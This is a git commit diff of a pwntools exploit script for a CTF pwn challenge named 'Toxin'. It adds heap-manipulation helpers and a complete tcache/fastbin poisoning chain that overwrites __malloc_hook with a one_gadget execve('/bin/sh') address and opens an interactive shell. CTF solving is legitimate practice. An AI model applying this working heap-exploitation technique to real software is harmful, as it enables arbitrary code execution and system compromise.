b539b2ac6efa78211ff8b6ac73b59a581746e646
ShundaZhang <zhangshunda@gmail.com>
2023-05-10 10:43:39 +0800

    Solving Toxin.

--- ctf/pwn/Toxin/dec.py
+++ ctf/pwn/Toxin/dec.py
@@ -11,6 +11,31 @@ def detect():
 		buf = io.recvline().strip().split(' ')[0]
 		print str(i+1)+' : '+buf
 
+# 1. Add toxin => Allocate chunk
+def add_toxin(length,index,data):
+	io.sendline("1")
+	io.recv()
+	io.sendline(str(length))
+	io.recv()
+	io.sendline(str(index))
+	io.recv()
+	io.sendline(data)
+	io.recv()
+# 2. Drink toxin => Free chunk
+def drink_toxin(index):
+	io.sendline("3")
+	io.recv()
+	io.sendline(str(index))
+	io.recv()
+# 3. Edit toxin => Rewrite the fd of the freed chunk
+def edit_toxin(index,data):
+	io.sendline("2")
+	io.recv()
+	io.sendline(str(index))
+	io.recv()
+	io.sendline(data)
+	io.recv()
+
 #ip, port = 
 #io = remote(ip, port)
 io = process('./toxin')
@@ -69,4 +94,42 @@ elf_main = int(io.recvline().strip().split(' ')[0],16)
 elf.address = elf_main - elf.sym['main']
 #print hex(elf.address)
 
+'''
+add_toxin(0x70,0,"A"*8)
+drink_toxin(0)
+edit_toxin(0,p64(0x55555555803d)) # toxinfreed - 19
+add_toxin(100,1,"C"*8)
+add_toxin(100,2,"D"*8 + "E"*8 + "F"*8 + "G" *8 ) # Overwriting
 
+one_gadget ./lib/libc.so.6
+0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f322 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+
+'''
+
+add_toxin(0x70,0,"A"*8)
+drink_toxin(0)
+edit_toxin(0,p64(elf.symbols["toxinfreed"] -0x13))
+
+add_toxin(100,1,"C"*8)
+add_toxin(100,2, "\x00"*35 + p64(libc.symbols['__malloc_hook']) + p64(0)*3)
+edit_toxin(0,p64(libc.address + 0x10a38c))
+
+### Call __malloc_hook and get the shell ---
+io.sendline("1")
+io.recv()
+io.sendline("1")
+io.recv()
+io.sendline("1")
+# ---
+io.interactive()
